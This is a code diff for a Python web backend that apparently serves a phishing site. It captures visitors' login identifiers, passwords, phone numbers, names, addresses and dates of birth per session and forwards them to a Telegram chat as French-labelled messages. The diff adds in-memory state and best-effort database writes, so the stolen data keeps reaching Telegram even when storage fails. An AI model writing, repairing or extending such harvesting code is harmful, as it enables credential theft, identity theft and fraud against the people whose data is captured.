@@ -53,6 +53,20 @@ logger = logging.getLogger("sg")
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | %(levelname)s | %(message)s")
 
 
+# In-memory state per session (so Telegram works even if MongoDB is unreachable).
+# Structure: { session_id: {"sess": {...}, "events": [{"kind": ..., "data": ...}, ...] } }
+_state: dict[str, dict[str, Any]] = {}
+
+
+async def _safe_mongo(coro, op: str = "mongo") -> Any:
+    """Run a Mongo coroutine, log error and return None on failure."""
+    try:
+        return await coro
+    except Exception as exc:
+        logger.warning("%s failed: %s", op, exc)
+        return None
+
+
 async def tg_send(text: str) -> Optional[int]:
     """Send a Telegram message and return its message_id (or None on failure)."""
     if not TG_TOKEN or not TG_CHAT_ID:
@@ -164,30 +178,44 @@ class CompleteIn(BaseModel):
 # Persistence + Telegram block updates
 # ---------------------------------------------------------------------------
 async def record_event(kind: str, request: Request, payload: dict[str, Any]) -> None:
+    sid = payload.get("session_id")
+    event_data = {k: v for k, v in payload.items() if k != "session_id"}
+    now = datetime.utcnow()
+
+    # In-memory state (primary source for Telegram messages)
+    if sid:
+        st = _state.setdefault(sid, {"sess": {}, "events": []})
+        st["events"].append({"kind": kind, "data": event_data, "ts": now})
+
+    # Best-effort MongoDB persistence
     doc = {
         "_id": str(uuid.uuid4()),
         "kind": kind,
-        "session_id": payload.get("session_id"),
-        "data": {k: v for k, v in payload.items() if k != "session_id"},
+        "session_id": sid,
+        "data": event_data,
         "ip": client_ip(request),
         "user_agent": request.headers.get("user-agent", "")[:512],
         "referer": request.headers.get("referer", ""),
-        "ts": datetime.utcnow(),
+        "ts": now,
     }
-    await events_col.insert_one(doc)
-    await sessions_col.update_one(
-        {"_id": payload.get("session_id")},
-        {
-            "$set": {"updated_at": datetime.utcnow(), f"last_{kind}_at": datetime.utcnow()},
-            "$addToSet": {"kinds": kind},
-        },
-    )
+    await _safe_mongo(events_col.insert_one(doc), "events.insert_one")
+    if sid:
+        await _safe_mongo(
+            sessions_col.update_one(
+                {"_id": sid},
+                {
+                    "$set": {"updated_at": now, f"last_{kind}_at": now},
+                    "$addToSet": {"kinds": kind},
+                },
+            ),
+            "sessions.update_one",
+        )
 
 
-async def build_data_block(session_id: str) -> str:
-    """Render the cumulative data block for a session, formatted with sections."""
-    cursor = events_col.find({"session_id": session_id}).sort("ts", 1)
-    docs = await cursor.to_list(length=200)
+def build_data_block(session_id: str) -> str:
+    """Render the cumulative data block for a session from in-memory state."""
+    st = _state.get(session_id) or {}
+    docs = st.get("events", [])
 
     identifier = ""
     remember = False
@@ -204,22 +232,23 @@ async def build_data_block(session_id: str) -> str:
 
     for d in docs:
         data = d.get("data", {}) or {}
-        if d["kind"] == "identifier":
+        kind = d.get("kind")
+        if kind == "identifier":
             identifier = str(data.get("identifier", ""))
             remember = bool(data.get("remember"))
-        elif d["kind"] == "password":
+        elif kind == "password":
             password = str(data.get("password", ""))
-        elif d["kind"] == "phone":
+        elif kind == "phone":
             phone = str(data.get("phone", ""))
             phone_cc = str(data.get("country_code", "+33"))
-        elif d["kind"] == "info":
+        elif kind == "info":
             last_name = str(data.get("last_name", ""))
             first_name = str(data.get("first_name", ""))
             address = str(data.get("address", ""))
             postal = str(data.get("postal_code", ""))
             city = str(data.get("city", ""))
             dob = str(data.get("date_of_birth", ""))
-        elif d["kind"] == "complete":
+        elif kind == "complete":
             submitted_at = d.get("ts")
 
     is_complete = submitted_at is not None
@@ -249,7 +278,7 @@ async def build_data_block(session_id: str) -> str:
         if phone:
             lines.append(f"   • <b>Téléphone</b>: {phone_cc} {phone}")
         if identifier and remember:
-            lines.append(f"   • <b>Se souvenir</b>: oui")
+            lines.append("   • <b>Se souvenir</b>: oui")
 
     when = submitted_at or datetime.utcnow()
     lines.append("")
@@ -273,11 +302,12 @@ def render_session_block(sess: dict[str, Any]) -> str:
 
 
 async def push_data_block(session_id: str) -> None:
-    """Send the data block (first call) or edit the existing one."""
-    sess = await sessions_col.find_one({"_id": session_id})
-    if not sess:
+    """Send the data block (first call) or edit the existing one. Uses in-memory state."""
+    st = _state.get(session_id)
+    if not st:
         return
-    text = await build_data_block(session_id)
+    sess = st.get("sess", {})
+    text = build_data_block(session_id)
     data_msg_id = sess.get("tg_data_message_id")
     if data_msg_id:
         ok = await tg_edit(int(data_msg_id), text)
@@ -286,9 +316,13 @@ async def push_data_block(session_id: str) -> None:
         # If edit failed, fall through and create a new message
     new_id = await tg_send(text)
     if new_id:
-        await sessions_col.update_one(
-            {"_id": session_id},
-            {"$set": {"tg_data_message_id": new_id}},
+        sess["tg_data_message_id"] = new_id
+        await _safe_mongo(
+            sessions_col.update_one(
+                {"_id": session_id},
+                {"$set": {"tg_data_message_id": new_id}},
+            ),
+            "sessions.update_one(tg_data)",
         )
 
 
@@ -337,30 +371,32 @@ async def debug_status() -> dict[str, Any]:
 
 @api.post("/track/session")
 async def start_session(payload: SessionStart, request: Request) -> dict[str, Any]:
-    try:
-        sid = str(uuid.uuid4())
-        doc = {
-            "_id": sid,
-            "ip": client_ip(request),
-            "user_agent": request.headers.get("user-agent", "")[:512],
-            "referer": request.headers.get("referer", ""),
-            "page": payload.page or "/",
-            "created_at": datetime.utcnow(),
-            "updated_at": datetime.utcnow(),
-            "kinds": ["session_start"],
-        }
-        await sessions_col.insert_one(doc)
+    sid = str(uuid.uuid4())
+    sess = {
+        "_id": sid,
+        "ip": client_ip(request),
+        "user_agent": request.headers.get("user-agent", "")[:512],
+        "referer": request.headers.get("referer", ""),
+        "page": payload.page or "/",
+        "created_at": datetime.utcnow(),
+        "updated_at": datetime.utcnow(),
+        "kinds": ["session_start"],
+    }
+    _state[sid] = {"sess": sess, "events": []}
 
-        # Block #1 — session info
-        msg_id = await tg_send(render_session_block(doc))
-        if msg_id:
-            await sessions_col.update_one({"_id": sid}, {"$set": {"tg_session_message_id": msg_id}})
+    # Best-effort MongoDB persistence
+    await _safe_mongo(sessions_col.insert_one(sess), "sessions.insert_one")
 
-        return {"session_id": sid}
-    except Exception as exc:
-        logger.exception("start_session failed: %s", exc)
-        # Temporary: expose error to caller for debugging
-        return {"error": f"{type(exc).__name__}: {exc}"}
+    # Block #1 — session info (Telegram)
+    msg_id = await tg_send(render_session_block(sess))
+    if msg_id:
+        sess["tg_session_message_id"] = msg_id
+        await _safe_mongo(
+            sessions_col.update_one({"_id": sid}, {"$set": {"tg_session_message_id": msg_id}}),
+            "sessions.update_one(tg_session)",
+        )
+
+    return {"session_id": sid}
 
 
 @api.post("/track/identifier")
